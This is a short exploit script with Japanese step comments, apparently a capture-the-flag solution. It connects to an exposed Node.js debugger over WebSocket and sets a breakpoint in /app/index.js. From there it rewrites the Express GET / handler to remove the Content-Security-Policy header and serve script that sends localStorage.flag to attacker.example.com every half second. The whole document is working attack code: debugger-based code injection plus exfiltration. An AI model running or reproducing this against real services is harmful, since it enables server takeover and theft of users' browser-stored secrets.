<?php echo file_get_contents('out.js'); // compile-code下でnpm run buildして出力されたJSファイル ?>

function sleep(t) {
    return new Promise(r => setTimeout(r, t));
}

const ws = new WebSocket('<?= $_GET['ws'] ?>');

ws.on('error', console.error);

// 4. まずは情報収集。/app/index.jsのScriptIdを得たい
ws.on('open', () => {
    ws.send(JSON.stringify({ id: 1, method: 'Runtime.enable' }));
    ws.send(JSON.stringify({ id: 2, method: 'Debugger.enable' }));
});

ws.on('message', async data => {
    const d = JSON.parse(data.toString());

    // 5. /app/index.jsのScriptIdをゲット。GET /にブレークポイントを置く
    if (d.method === 'Debugger.scriptParsed') {
        if (!d.params.embedderName.includes('/app/index.js')) return;
        ws.send(JSON.stringify({
            id: 3, method: 'Debugger.setBreakpoint',
            params: {
                location: { scriptId: d.params.scriptId, lineNumber: 16 }
            }
        }));
    }

    // 6. setIntervalで回していたおかげでGET /のハンドラに到達
    // reqからたどってLayerのhandleを書き換えることで、GET /のハンドラを置き換えられる
    // CSPヘッダを削除しつつ、レスポンスとしてlocalStorageを外部に送信するものへ変える
    if (d.method === 'Debugger.paused') {
        ws.send(JSON.stringify({
            id: 4, method: 'Debugger.evaluateOnCallFrame',
            params: {
                callFrameId: d.params.callFrames[0].callFrameId,
                //expression: `req.route.stack[0].handle = (req, res) => { res.removeHeader('Content-Security-Policy'); res.send('<script>alert(123)</script>') }`
                expression: `req.route.stack[0].handle = (req, res) => { res.removeHeader('Content-Security-Policy'); res.send('<script>setInterval(()=>{(new Image).src="http://attacker.example.com/log?" + localStorage.flag}, 500)</script>') }`
            }
        }));
        await sleep(1000);
        ws.send(JSON.stringify({
            id: 5, method: 'Debugger.resume'
        }));
        await sleep(1000);
        ws.close();
    }
});

setInterval(() => { fetch('http://localhost:3000'); }, 500);
setTimeout(() => { ws.close(); }, 10_000);